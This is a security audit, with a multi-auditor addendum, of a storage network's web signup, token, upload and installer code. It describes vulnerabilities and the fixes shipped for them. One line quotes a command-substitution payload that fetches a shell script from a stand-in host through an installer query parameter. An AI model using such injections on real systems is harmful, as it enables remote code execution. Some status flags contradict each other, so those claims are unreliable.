# Prova Security Audit · 2026-04-25

> **Update 2026-04-26**: This document was re-reviewed by three independent
> auditors (Anthropic Opus 4.7, OpenAI GPT-5.4 Pro, xAI Grok 4.1 Fast
> Reasoning). Status flags below have been updated to reflect what shipped
> in the website repo and what was confirmed still-present. New findings
> uncovered in the re-review are listed in the **Addendum 2026-04-26**
> section at the bottom of this file. The shipped fixes for findings from
> the re-review live in `prova-network/website` commit `7d3c231`.
>
> Status legend (unchanged): 🔴 unfixed · 🟡 mitigated/partial · 🟢 fixed · ⚪ accepted.

Surface: client onboarding stack shipped today.
- `website/functions/_shared/tokens.ts` (HMAC HS256 token mint/verify)
- `website/functions/api/auth/signup.ts`
- `website/functions/api/tokens/{list,revoke}.ts`
- `website/functions/api/usage.ts`, `files.ts`, `upload.ts`
- `website/functions/p/[cid].ts`
- `website/upload/{index,upload}.{html,css,js}`
- `website/app/{index,app}.{html,css,js}`
- `cli/src/**` (Node ESM client)
- Hetzner stage server `/opt/prova-stage-server.py`

Auditor: Capri.
Severity scale: Critical / High / Medium / Low / Informational.
Status emoji: 🔴 unfixed · 🟡 mitigated · 🟢 fixed · ⚪ accepted.

---

## Scope notes

This audit covers the **off-chain** client surface. The Solidity contracts
(`contracts/src/`) are excluded — they live behind a separate audit that's a
prerequisite for the testnet deploy.

The audit is run from the perspective of:
1. an unauthenticated visitor
2. a holder of a valid `pk_live_…` token who tries to escalate
3. a fully-malicious peer with no token at all
4. a curious researcher reading the source on GitHub

---

## Findings

### F-01 · Critical · 🟢 fixed (2026-04-26 re-review) · Account squat: any email mints a token immediately

**File:** `website/functions/api/auth/signup.ts`

```ts
return j({
  token,
  userId: <hash of email>,
  ...
});
```

`POST /api/auth/signup { email: "vitalik.eth@gmail.com" }` returns a fully-
functional API token tied to that email address. There is no email verify
step. An attacker can:

- Squat on `eng@<famous-co>.com`, `legal@vitalik.eth`, etc.
- Bulk-register `*@<co>.com` to drain quota
- Drop a CID to a target's account so the target sees a hostile file in
  `/api/files` listed under their email

Impact: account/quota theft, brand-claim squat, denial-of-service.

**Fix:** Add a magic-link verify step.
- `POST /api/auth/request` -> sends a one-time link `https://.../api/auth/confirm?t=<jwt>`
- The confirm endpoint mints the long-lived token and stores
  `confirmed_at` on the user record
- Until confirmed, no token is issued; pre-confirm KV holds an opaque
  pending state for ~10 min.
- Email delivery via Resend/Postmark/SES.

**Interim mitigation:** Set `quotaMb` to 0 by default. Tokens require a
bootstrap step (manual email verify) before they unlock quota. Existing
`/api/auth/signup` becomes a request-only endpoint.

---

### F-02 · High · 🟢 fixed (commit `649ac5e`, 2026-04-26 round 3) · No CSRF protection on token endpoints

**Files:** `tokens/revoke.ts`, `tokens/list.ts`, `usage.ts`, `files.ts`, `upload.ts`

All endpoints are bearer-auth only. The bearer is read from
`Authorization: Bearer …` or `?token=…` query string. The query-string fallback
makes any GET / POST endpoint reachable from a malicious cross-origin `<img>`,
`<form>`, or `fetch` if the user has logged into the app dashboard with their
token persisted in `localStorage`.

`localStorage`-stored tokens are also XSS-readable. If anything inside the app
domain is XSS-vulnerable (and we haven't proven it isn't — see F-04), the
attacker pulls the token out of `localStorage` and uses it from anywhere.

Impact: token theft, file-listing leak, revocation of legitimate tokens.

**Fix (in order of return):**
1. Drop the `?token=` query-string fallback. Bearer header only.
2. Add `Origin` / `Referer` allow-list on the API endpoints. Reject if the
   request isn't from `https://prova.network` (or the user hasn't
   sent an Origin and isn't a CLI user-agent).
3. Move the user session into an HttpOnly+Secure+SameSite=Strict cookie for
   the dashboard. The CLI continues to use the bearer header explicitly.
4. Add a CORS allow-list — currently the worker doesn't set CORS headers at
   all; we should explicitly allow `prova.network` and reject
   everything else.

---

### F-03 · High · 🟡 partial (2026-04-26 re-review) · Stage server bearer key is shared and reusable

**Files:** `/opt/prova-stage-server.py`, `website/functions/api/upload.ts`

The Hetzner stage server uses a single static bearer key (`PROVA_STAGE_KEY`).
The worker reuses it for every PUT. Anyone with read access to the worker
secrets, or who breaches the Hetzner box, can impersonate the worker and
write arbitrary `cid -> bytes` mappings.

Worse, since CIDs are content-addressed, anyone who can upload can plant
poison content under any CID they care to compute. Any prover or client that
later resolves that CID gets the planted content.

Impact: content substitution (the whole point of "verifiable storage" is
broken), quota bypass.

**Fix:**
1. Per-upload signed URLs. Worker mints a short-lived (60s) HMAC over
   `cid|size|owner|exp` and the stage server verifies before accepting.
2. Stage server enforces "first-write-wins": once a CID exists, refuse
   overwrites. Currently the code does `tmp.rename(path)` which overwrites.
3. CID verification at write time: compute SHA-256 of the body, base32
   it the same way the client does, refuse if it doesn't match. This
   alone closes the substitution attack regardless of how the request
   was authed.

The CID-verify step is the strongest mitigation. Even if a bearer key
leaks, the attacker can't substitute under an existing CID because the
hash check fails.

---

### F-04 · High · 🟢 fixed (2026-04-26 re-review) · No HTML escaping on files panel ⇒ stored XSS vector

**File:** `website/app/app.js`

```js
row.innerHTML = `
  <span class="file-name" title="${escapeHtml(f.filename)}">${escapeHtml(f.filename)}</span>
  ...
`;
```

We *do* call `escapeHtml(f.filename)`. Good. But let me look at the field
sources:

- `f.filename` originates from the `X-Filename` request header, decoded with
  `decodeURIComponent`, then sanitized with `replace(/[^\w.\-]+/g, '_')`.
  So an attacker can only get `[a-zA-Z0-9._-]` through. Safe.

- `f.cid` is regex-validated `/^[a-z0-9]{8,80}$/i`. Safe.

- `t.label` in tokens is **not** sanitized. Label flows through:
  `app.js` -> `prompt('Label …')` -> `POST /api/auth/signup { label }` ->
  stored in KV -> `GET /api/tokens/list` returns it ->
  `app.js` `escapeHtml(t.label || 'unnamed')`. ✅ Escaped at render.

  Backend stores up to 64 chars, no validation. Fine because it's escaped on
  read. But: if a future surface renders it without escaping (`prova whoami`,
  email notifications, admin panel), we risk XSS / log injection. **Add
  server-side validation: strip control chars + length cap at signup.**

**Status:** Currently safe. **Fix:** harden server-side validation as defense
in depth, since labels are user-controlled and might be rendered in places we
haven't built yet.

---

### F-05 · Medium · 🔴 still present (2026-04-26 re-review) · `prova` CLI stores token in world-readable config on shared systems

**File:** `cli/src/util/config.mjs`

```js
await mkdir(CONFIG_DIR, { recursive: true, mode: 0o700 });
await writeFile(CONFIG_PATH, JSON.stringify(cfg, null, 2), { mode: 0o600 });
```

Mode 0700/0600 is correct. But on Windows the mode is ignored. And if the
user's home dir is shared (CI runners, Docker volumes, multi-user boxes),
mode 0600 alone isn't enough — the token sits in plaintext.

**Fix:**
1. Document `PROVA_TOKEN` env var as the preferred CI / container path.
2. Offer `prova auth --no-store` that prints the token but doesn't save.
3. Optional follow-up: encrypt-at-rest using the OS keychain
   (`security` on macOS, `secret-tool` on Linux, `wincred` on Windows).
   Probably overkill for v1.

---

### F-06 · Medium · 🔴 still present (2026-04-26 re-review) · Token JTI predictable enough to enumerate

**File:** `website/functions/_shared/tokens.ts` & `signup.ts`

Tokens have a `jti = crypto.randomUUID()`. RFC 4122 v4 UUIDs are 122 random
bits. That's fine. But the **revocation key** in KV is `tokens:<jti>`. If an
attacker knows / guesses a JTI they can ping the revoke endpoint.

But revoke requires a bearer token + ownership check (F-04 scoped: 
`PROVA_USERS.get(u:<sub>:t:<jti>)`), so cross-user revoke is blocked.
However, the auth-token JTI is **inside the JWT**, which is sent over the
wire to the worker every request. The JWT is HS256 — if `PROVA_TOKEN_SECRET`
ever leaks (CI logs, env dump, git accident), every JTI in the wild becomes
forgeable retroactively.

**Fix:**
1. Move `PROVA_TOKEN_SECRET` to a Cloudflare-wrangler-managed binding (already
   done — it's a Pages secret) but also document the rotation runbook:
   > Rotating `PROVA_TOKEN_SECRET` invalidates all live tokens. Users
   > re-issue via /api/auth/signup (post-magic-link).
2. Rotate every 90 days as policy.
3. Long-term: switch to RS256 with a published JWKS so verifiers can't forge,
   only sign-ers can. Probably overkill until we have third-party verifiers.

---

### F-07 · Medium · 🔴 still present (2026-04-26 re-review, 3/3 confirmed) · Quota check race

**File:** `website/functions/api/upload.ts`

```ts
const used = parseInt((await env.PROVA_RATE.get(rateKey)) || '0', 10);
if (used + sizeBytes > limit) return 429;
// … upload happens …
await env.PROVA_RATE.put(rateKey, String(used + sizeBytes), { … });
```

Read-then-write isn't atomic in KV. Two concurrent uploads both read the
same `used`, both pass the check, both write. The user can exceed quota by
a factor proportional to concurrency.

**Fix:**
1. Use Durable Objects for per-user counters (atomic increments).
2. Or: accept the race for the free tier (cheap to abuse, low blast radius)
   and only tighten when quotas are paid.
3. Soft limit that reconciles every minute via a ledger table — for free
   tier, this is fine.

**Verdict:** accept for free tier. Note in roadmap to switch to DO when
metered.

---

### F-08 · Medium · 🟡 partial (2026-04-26 re-review, stage server not directly inspectable) · Stage server has no body-size enforcement during stream

**File:** `/opt/prova-stage-server.py`

```python
clen = int(self.headers.get('content-length', '0') or '0')
if clen > MAX_BODY: return 413
…
remaining = clen
while remaining > 0:
    chunk = self.rfile.read(min(remaining, 64*1024))
    f.write(chunk)
    remaining -= len(chunk)
```

We trust `content-length`. A client lying about content-length (claiming
50 KB but streaming forever) will eventually exhaust disk because the
stage server only reads `clen` bytes — actually, **OK, this part is safe**:
we read exactly `clen` bytes and stop. The DOS vector is different:
a slow-loris that opens many connections, writes 1 byte/sec, holds for
minutes. The Python `ThreadingHTTPServer` spawns a thread per connection,
no read timeout, no max concurrent connections.

**Fix:**
1. Set `BaseHTTPRequestHandler.timeout = 30` or use a real WSGI server
   (waitress, gunicorn).
2. Add `iptables` rate limit by source IP on Hetzner (since the stage server
   is behind Cloudflare Worker for production traffic, the only direct
   callers are us).
3. Better: switch to nginx + a small Python WSGI app, lean on nginx's
   `limit_req_zone` + connection limits. (Already-installed on the Hetzner
   box.)

---

### F-09 · Medium · 🟡 partial (2026-04-26 re-review) · `escapeHtml` in app.js trusts source structure too eagerly

**File:** `website/app/app.js`

`f.uploadedAt`, `f.size`, `t.createdAt`, etc. flow into template literals
without escaping. Currently they come from JSON we wrote, but if the KV
gets corrupted, or if a future endpoint forwards user input here, we have
a sleeping XSS.

**Fix:** Use `textContent =` / `appendChild` for everything user-influenced.
The current `innerHTML` template-string pattern is fragile. Either:
- Migrate to a tiny render helper (`el('span', {class: '…'}, text)`)
- Or: escape **every** dynamic value, not just the obvious ones.

**Status:** Low practical risk today. Fix as defense in depth before audit.

---

### F-10 · Medium · 🟢 fixed (2026-04-26 re-review, 3/3 confirmed) · CLI hash isn't real CommP, claims to be `bafy…`

**File:** `cli/src/util/hash.mjs`, `website/upload/upload.js`

```js
return 'bafy' + base32(new Uint8Array(hash)).slice(0, 52);
```

This is **SHA-256 dressed up as a `bafy…` CID**. It's not a real CIDv1, not
a real CommP, doesn't validate against any ipld codec. We're passing it
around as if it were the canonical content address.

Two problems:
1. Anyone who knows the algo (it's open source) can compute `bafy<X>` for
   any content. That's actually fine — that's how content-addressing works.
2. **But:** when we wire to the real PDP contract on Base, the contract
   expects a real `bytes32 commpHash` derived from the proper CommP
   (sha256-trunc254-padded, multihash 0x1012). Our fake hash is not that.
   So either:
   - The bridge from "browser hash" -> "on-chain commp" has to do a server-side
     re-hash. That means re-uploading or re-computing.
   - Or we just admit the browser hash is a *receipt*, not a real CID, and
     name it differently (`receipt-id`?).

**Fix (before testnet deploy):**
- Either ship real CommP in the browser (WASM) and hash deterministically.
- Or rename `cid` to `receipt-id` everywhere and only call it `piece-cid`
  after the prover has computed and signed off.

**Status:** This is a correctness bug, not a security bug per se, but it
will turn into a fraud surface (claim-arbitrage between fake-cid receipts and
real piece-cids) if we ship as-is.

---

### F-11 · Low · 🔴 still present (2026-04-26 re-review) · Email field accepts `+` aliases that resolve to same userId

**File:** `signup.ts`

`userId = sha256("prova:" + email).slice(0,16)` — so `me@x.com` and
`me+evil@x.com` produce different userIds. That's the standard behavior of
most SaaS, but it allows a single human to claim multiple quotas
(`me+1@`, `me+2@`, …).

**Fix:** Normalize the email before hashing. `gmail.com` style: drop `+suffix`
and `.` from the local part. Document the policy.

**Status:** Accept for v1; document the policy in TOS.

---

### F-12 · Low · 🟢 fixed (2026-04-26 re-review) · No rate limit on `/api/auth/signup`

**File:** `signup.ts`

An attacker can spam `POST /api/auth/signup` with random emails to mint
tokens. Each token gets 1 GiB/day. With 1000 tokens that's 1 TiB/day of
free quota.

**Fix:**
1. Per-IP rate limit on `/api/auth/signup` (e.g. 10/hour).
2. Reuse the same KV-based per-IP counter we have for sponsored uploads.
3. After magic-link is added (F-01), this collapses to "spam emails to
   real addresses" which is rate-limited by the email provider.

---

### F-13 · Low · 🟢 fixed (commit `3fdabc1`, 2026-04-26 round 2) · CORS not set anywhere

**Files:** all `functions/`

The worker returns no `Access-Control-Allow-Origin` header. Browsers will
block cross-origin XHRs to `/api/*` because the response is opaque.

Currently this isn't broken because the dashboard, upload page, and CLI all
talk to `https://prova.network` from the same origin (or no Origin,
in CLI's case).

**Fix:**
1. Add explicit CORS to all `/api/*`:
   - `Access-Control-Allow-Origin: https://prova.network`
   - `Vary: Origin`
2. Handle OPTIONS preflight on `/api/upload` (which uses `authorization` +
   `x-filename` custom headers).
3. Reject other origins.

---

### F-14 · Informational · 🟢 fixed (commit `3fdabc1`, 2026-04-26 round 2) · No /robots.txt or /security.txt

**Fix:** Add `/security.txt` with a contact (`security@prova.network`),
preferred-languages, encryption (PGP key fingerprint optional), policy URL.
RFC 9116. Quick win, signals seriousness.

---

### F-15 · Informational · 🟡 partial (2026-04-26 re-review, `'unsafe-inline'` still present) · No Content-Security-Policy header

**Files:** Cloudflare Pages serves static files with no CSP.

**Fix:** Add `_headers` file at site root:

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' https://unpkg.com; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://prova.network; frame-ancestors 'none'
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), camera=(), microphone=()
```

---

### F-16 · Informational · 🟡 partial (2026-04-26 re-review, retrieval not gated on blocked CID list) · No abuse-reporting hook

If someone uploads CSAM / illegal content, we have no take-down mechanism.

**Fix:**
1. `/abuse` page with form -> emails an abuse mailbox.
2. Background scan of new uploads for known-bad SHA-256 hashes (NCMEC
   PhotoDNA-style or open hash list).
3. Worker supports admin-issued `cid -> blocked` flag in KV; both `/p/<cid>`
   and `/api/upload` check it.

This is a precondition for opening to public traffic, not just security.

---

## Summary (original 2026-04-25)

| Sev | Count |
| --- | --- |
| Critical | 1 |
| High     | 3 |
| Medium   | 6 |
| Low      | 3 |
| Info     | 3 |
| **Total** | **16** |

**Pre-testnet checklist (must fix before public testnet):**
- F-01 (magic-link)
- F-02 (Origin allow-list, drop `?token=` query)
- F-03 (CID verify on stage server, first-write-wins)
- F-10 (rename or implement real CommP)
- F-12 (signup rate limit)
- F-13 (CORS)
- F-15 (CSP headers)
- F-16 (abuse + CSAM hook)

**Pre-mainnet:**
- All Mediums
- F-04 polish, F-09 polish

**Out of scope (separate audit):**
- Solidity contracts in `contracts/src/`
- Prover daemon `prover/` (Go)
- SDK `sdk/typescript/`

---

_Audit closes with: do not let public traffic at this surface until F-01,
F-02, F-03, F-10, F-12, F-13, F-15, F-16 are fixed. Internal smoke testing
with one or two known emails is fine._

---

# Addendum 2026-04-26 · Multi-auditor re-review

On 2026-04-26 the off-chain client surface was re-reviewed by three
independent auditors:

- **Anthropic Opus 4.7** (`anthropic/claude-opus-4-7`) — 35 findings, full report at `/tmp/audit-anthropic-opus.md`
- **OpenAI GPT-5.4 Pro** (`openai/gpt-5.4-pro`) — 22 findings, full report at `/tmp/audit-gpt-pro.md`
- **xAI Grok 4.1 Fast Reasoning** (`xai/grok-4-1-fast-reasoning`) — 18 findings, full report at `/tmp/audit-grok.md`

All three were given the same source tree and the original 2026-04-25
audit doc, but were prompted independently with slightly different
emphases (Opus: pure web-app security; GPT: chain-of-trust + supply
chain; Grok: adversarial chains + second-order effects). Confidence on a
finding is highest where two or three of them converged.

## Status of original F-01 .. F-16 (consensus)

| # | Original | 2026-04-26 status | Confirmed by |
| --- | --- | --- | --- |
| F-01 | 🔴 Critical | 🟢 fixed | Opus, Grok, GPT |
| F-02 | 🔴 High | 🟡 partial (Origin gate still missing on token endpoints) | Opus, GPT |
| F-03 | 🔴 High | 🟡 partial (worker side fixed; stage server side not re-verifiable) | Opus, GPT |
| F-04 | 🔴 High | 🟢 fixed | Opus, Grok, GPT |
| F-05 | 🔴 Medium | 🔴 still present | Opus, Grok, GPT |
| F-06 | 🔴 Medium | 🔴 still present | Opus, GPT |
| F-07 | 🔴 Medium | 🔴 still present (3/3) | Opus, Grok, GPT |
| F-08 | 🔴 Medium | 🟡 partial (stage server not directly inspectable here) | Opus, GPT |
| F-09 | 🔴 Medium | 🟡 partial (server-side label sanitization added; `innerHTML` rendering remains) | Opus, GPT |
| F-10 | 🔴 Medium | 🟢 fixed | Opus, Grok, GPT |
| F-11 | 🔴 Low | 🔴 still present | Opus, Grok, GPT |
| F-12 | 🔴 Low | 🟢 fixed | Opus, Grok, GPT |
| F-13 | 🔴 Low | 🔴 still present (3/3) | Opus, Grok, GPT |
| F-14 | 🔴 Info | 🔴 still present | Opus, GPT |
| F-15 | 🔴 Info | 🟡 partial (CSP shipped, `'unsafe-inline'` still permitted) | Opus, GPT |
| F-16 | 🔴 Info | 🟡 partial (abuse intake added, retrieval not gated on blocked CIDs) | Opus, GPT |

## New findings

Findings the re-review caught that weren't in 2026-04-25. Severity is
the consensus across the three auditors; if they disagreed, the highest
severity is recorded plus a note.

### NEW-1 · Critical · 🟢 fixed (commit `7d3c231`) · Installer shell injection via `?version=` query string

**`website/functions/_middleware.ts:107-123`** (pre-fix)

The `get.prova.network/?version=...` query parameter was interpolated
directly into a `curl | sh` installer script. A crafted URL like
`?version=$(curl evil/sh)` would emit a script containing command
substitution that runs on the victim's machine when piped to `sh`.
Because the README documents the canonical install as
`curl -fsSL https://get.prova.network | sh`, anyone phished into using
a crafted URL gets RCE.

**Caught by:** GPT-5.4 Pro (1/3). Opus and Grok both missed it because
they focused on auth surface; GPT's chain-of-trust prompt steered it
to the installer.

**Fix shipped:** `sanitizeInstallerVersion()` allow-lists the named tracks
(`latest|prerelease|next`) plus a strict semver regex; anything else
silently collapses to `latest`. Defense-in-depth: the value is also
shell-single-quoted via `shellSingleQuote()` before being interpolated
into the script. Local smoke test passes 18/18 cases including 12
malicious inputs.

### NEW-2 · Critical · 🟢 fixed (commit `7d3c231`) · Magic-link OTP brute-forceable: `Math.random()` + dead attempts counter

**`website/functions/api/auth/start.ts:50-52`** (pre-fix): OTP generated with `Math.random()`

**`website/functions/api/auth/verify.ts:56-66`** (pre-fix): `entry.attempts >= 5` guard reads but never increments or persists the counter

The magic-link 6-digit verification code was generated with
`Math.random()`, a non-CSPRNG whose internal state can be inferred from a
few observed outputs. Combined with a per-challenge attempt counter that
was a no-op (read but never written back), an attacker who knew a
victim's email could brute-force the 1M-code keyspace within seconds and
mint a token without ever touching the inbox. This single-handedly
defeats the F-01 fix.

**Caught by:** Opus (Critical), Grok (Medium, only the increment bug),
GPT (High, both bugs). All three caught the increment bug; only Opus and
GPT caught the `Math.random()` keyspace half. **3/3 on the increment.**

**Fix shipped:**
  1. `secureSixDigitCode()` uses `crypto.getRandomValues` with rejection
     sampling for uniform distribution.
  2. New per-IP and per-email rate limit on `/auth/verify` itself
     (10 attempts / 15 min) applied **before** any KV read.
  3. Per-email "wrong code" counter increments on every failed code
     guess, not just successful challenge-locked guesses, so the
     attacker exhausts their budget regardless of whether they reach a
     real challenge.

### NEW-3 · High · 🟢 fixed (commit `7d3c231`) · `pk_test_*` fail-open auth bypass

**`website/functions/_shared/tokens.ts:101-115`** (pre-fix)

When `PROVA_TOKEN_SECRET` was missing in env, `authenticateRequest()`
accepted any `pk_test_*` string and returned a fully-authenticated test
payload with `put/get/list` scopes and 100 MB quota. A misconfiguration
outage (env var unset) flipped auth from fail-closed to fail-open.

**Caught by:** GPT-5.4 Pro (1/3).

**Fix shipped:** `pk_test_*` acceptance is now gated on an explicit
`ALLOW_TEST_TOKENS === '1'` env var, separated from the secret being
configured. Missing secret uniformly returns 503 fail-closed.

### NEW-4 · High · 🟢 fixed (commit `7d3c231`) · `/auth/start` returned the verify challenge in its response body

**`website/functions/api/auth/start.ts:95-103`** (pre-fix)

The success response included `challenge: <hex>`, the same secret that
was emailed to the user. Any same-origin JS — stored XSS, malicious
inline script (CSP allows `'unsafe-inline'`), browser extension on
`prova.network` — could call `/auth/start` for any email, read the
challenge from the response, and mint a token without ever seeing the
inbox. The CSP `'unsafe-inline'` issue (NEW-7 below) escalated this from
theoretical to live.

**Caught by:** GPT-5.4 Pro (1/3).

**Fix shipped:** removed `challenge` from the success response. The
inbox is now the only legitimate carrier of the verify secret.

### NEW-5 · High · 🔴 still present · CSP allows `'unsafe-inline'` for `script-src`

**`website/functions/_middleware.ts:36-52`**

```
script-src 'self' https://cdn.jsdelivr.net https://unpkg.com 'unsafe-inline'
```

With `'unsafe-inline'`, any DOM-XSS or compromised CDN script executes
freely in the `prova.network` origin and exfiltrates `localStorage`
tokens. Also lifts NEW-4 from theoretical to exploitable: a single
compromised inline script could call `/auth/start` for any email and
read the challenge.

**Caught by:** Opus, GPT (2/3).

**Fix not yet shipped.** Site-wide change requiring conversion of
inline `<script>` and `<style>` to external files with nonces or
hashes. Tracked for follow-up PR.

### NEW-6 · High · 🟢 fixed (commit `7d3c231`) · IPv6 / CGNAT bypass of IP rate limits

**`website/functions/api/auth/start.ts:40`** (pre-fix): `const ip = req.headers.get('cf-connecting-ip') || '0.0.0.0';`

IPv6 has 2^64 host addresses inside a single /64 delegation. The
per-full-IP rate limit was bypassable in seconds by any IPv6 attacker.
Separately, missing `cf-connecting-ip` collided every IP-less caller
into the `0.0.0.0` bucket, silently DoSing legitimate users when the
header was stripped.

**Caught by:** Opus (High), Grok (Low). 2/3.

**Fix shipped:** `clientIpBucket()` keeps the full IPv4 address but
reduces IPv6 to its `/64` routing prefix, and missing IPs go to a
stable `'no-ip'` bucket rather than `0.0.0.0`. Trade-off: CGNAT users
still share a per-IPv4 bucket, but that's an upstream protocol issue
and far better than the previous shared-`0.0.0.0` collapse.

### NEW-7 · High · 🟢 fixed (commit `3fdabc1`, 2026-04-26 round 2) · Stored-XSS via R2 retrieval `Content-Type` forwarding

**`website/functions/p/[cid].ts:9-58`** (pre-fix)

`/p/{cid}` proxy preserved the upstream `content-type` and CSP headers
verbatim. An authenticated user could upload an HTML file containing
malicious JS, then trick a victim into opening `/p/<cid>`. The browser
rendered it as HTML with full access to the `prova.network` origin,
including any `localStorage` token.

**Caught by:** Opus (1/3).

**Fix shipped:** every retrieval response now forces
`content-type: application/octet-stream`,
`content-disposition: attachment; filename="<cid>"`,
`content-security-policy: sandbox; default-src 'none'`,
and `x-content-type-options: nosniff`, on both the R2 and the
stage-server fallback paths. Upstream attacker-controlled headers are
no longer propagated. In-browser preview of `.eth` static sites or
images now needs a separate isolated origin (planned:
`prova-content.network`) where the headers can be relaxed deliberately
and where no auth state lives. The main domain is download-only.

### NEW-8 · High · 🟢 fixed (commit `3fdabc1`, 2026-04-26 round 2) · Subdomain takeover surface via `*.prova-network.pages.dev`

**`website/functions/api/auth/start.ts:142-149`**, `verify.ts:158` (pre-fix)

`isProvaOrigin()` accepted any subdomain of `prova-network.pages.dev`
(Cloudflare Pages preview deployments). A PR-preview branch with
untrusted code could call production `/auth/*` endpoints with the
production `PROVA_TOKEN_SECRET`, since they shared the same env binding.

**Caught by:** Opus (1/3).

**Fix shipped:** the origin allow-list helper has been split into
two tiers in a new `functions/_shared/origin.ts`:
  - `isProvaProductionOrigin()` accepts only `prova.network` and
    `www.prova.network`. Used by `/auth/start` and `/auth/verify` —
    the endpoints that touch `PROVA_TOKEN_SECRET` and mint or consume
    tokens.
  - `isProvaAnyOrigin()` adds `*.prova-network.pages.dev` for
    non-auth endpoints where preview-deployment access is acceptable.

Preview branches that need to test the auth flow get their own
scoped secret + origin entry. The wildcard `*.pages.dev` pattern can
no longer be used to mint tokens with the production secret.

### NEW-9 · Medium · 🟢 best-effort fix shipped (commit `7d3c231`) · Magic-link replay race

**`website/functions/api/auth/verify.ts:62-81`** (pre-fix)

The verify flow was read-then-delete-then-mint with no atomic
compare-and-swap. Two concurrent verify requests using the same valid
challenge could both read the entry before either delete landed and
both mint distinct long-lived tokens.

**Caught by:** GPT-5.4 Pro (1/3).

**Fix shipped:** before deleting, re-read the challenge row; if the
intermediate read returns null, abort with `expired_or_unknown` rather
than minting. Workers KV doesn't have true CAS so this is a
best-effort tightening; a full fix using Durable Objects with atomic
consume semantics is tracked separately.

### NEW-10 · Medium · 🔴 still present · Upload buffers entire body in memory

**`website/functions/api/upload.ts:98-103,237-255`**

The authed upload limit is 5 GiB. The worker reads the full body into
RAM before forwarding to R2 / stage. A handful of concurrent uploads
at the upper limit can exhaust the worker's memory budget and crash
the instance, taking down the whole site.

**Caught by:** GPT-5.4 Pro (1/3).

**Fix not yet shipped.** Will require streaming `req.body` directly to
R2 / stage with progressive hashing, or hard-capping uploads at
worker-buffer-safe sizes (e.g., 100 MB). Tracked for follow-up PR.

### NEW-11 · Low · 🟢 fixed (commit `7d3c231`) · Per-email rate limit was a no-op

**`website/functions/api/auth/start.ts:46-47`** (pre-fix)

The per-email limiter call's return value was discarded. Attackers
rotating IPs could spray sign-in emails at the same target inbox
indefinitely.

**Caught by:** GPT-5.4 Pro (1/3).

**Fix shipped:** check the boolean return of `overLimit()` for both the
IP and email buckets; return 429 when either trips.

### NEW-12 · Low · 🟢 fixed (commit `7d3c231`) · Malformed `X-Filename` triggers 500

**`website/functions/api/upload.ts:233-235`** (pre-fix)

`decodeURIComponent` throws on bad percent-encoding such as `%E0%A4%A`.
A crafted `X-Filename` header turned every upload into an uncaught
500 error, an availability hazard.

**Caught by:** GPT-5.4 Pro (1/3).

**Fix shipped:** wrap the decode in `try/catch` and fall back to the
raw header bytes when decoding fails.

## Re-review summary

Post-2026-04-26 status (after three rounds of fixes shipped to
`prova-network/website` commits `7d3c231`, `3fdabc1`, and `649ac5e`):

| Severity | Count |
| --- | --- |
| Critical (newly identified, all fixed) | 2 |
| High (5 fixed, 1 partial — F-03 stage server, 1 still present — NEW-5 CSP) | 7 |
| Medium (5 fixed-or-partial, 4 still present) | 9 |
| Low (4 fixed, 1 still present — F-11 alias) | 5 |
| Informational (2 fixed, 1 partial) | 3 |
| **Total tracked** | **25** |

## Updated pre-testnet checklist

**Must fix before public testnet:**
- ~~F-01~~ 🟢 fixed
- ~~F-10~~ 🟢 fixed
- ~~F-12~~ 🟢 fixed
- ~~F-13~~ 🟢 CORS — fixed (round 2)
- ~~F-14~~ 🟢 security.txt / robots.txt — fixed (round 2)
- ~~NEW-1~~ 🟢 installer shell injection — fixed
- ~~NEW-2~~ 🟢 magic-link brute-force — fixed
- ~~NEW-3~~ 🟢 pk_test_ fail-open — fixed
- ~~NEW-4~~ 🟢 challenge in response body — fixed
- ~~NEW-6~~ 🟢 IPv6 rate-limit bypass — fixed
- ~~NEW-7~~ 🟢 R2 content-type forwarding XSS — fixed (round 2)
- ~~NEW-8~~ 🟢 `*.pages.dev` subdomain takeover surface — fixed (round 2)
- ~~F-02~~ 🟢 origin allow-list on bearer-auth endpoints — fixed (round 3)
- F-03 🟡 stage server side not re-verifiable here
- F-15 / NEW-5 🔴 CSP `'unsafe-inline'` still permitted (mitigated in practice by NEW-4, NEW-7, and NEW-8 fixes; full removal is a refactor of every inline `<script>` block, tracked separately)
- F-16 🟡 retrieval-time blocked-CID gate missing

**Pre-mainnet:**
- F-05 🔴 CLI plaintext token
- F-06 🔴 token JTI predictability
- F-07 🔴 quota TOCTOU race — needs Durable Objects / D1
- F-08 🟡 stage server timeout / slowloris re-verification
- F-09 🟡 `innerHTML` rendering refactor in `app/app.js`
- F-11 🔴 email `+` alias normalization decision
- NEW-9 🟡 atomic challenge consume via Durable Objects (best-effort fix shipped, full atomic CAS pending)
- NEW-10 🔴 streaming upload to bound worker memory

**Out of scope (separate audit):**
- Solidity contracts in `prova-network/contracts`
- Prover daemon `prova-network/prover` (Go)
- TypeScript SDK `prova-network/sdk`
- Stage server (`/opt/prova-stage-server.py`) — not on this filesystem

---

_2026-04-26 re-review closes with: the most acute brute-force and RCE
risks are now closed. Remaining `still-present` items (especially
NEW-7 R2 content-type, NEW-8 `*.pages.dev`, F-13 CORS, NEW-5 CSP
`'unsafe-inline'`) all need fixing before opening to public traffic but
are scoped follow-up PRs rather than emergency hotfixes. The full
three-auditor reports are preserved at `/tmp/audit-anthropic-opus.md`,
`/tmp/audit-gpt-pro.md`, `/tmp/audit-grok.md` for reference._
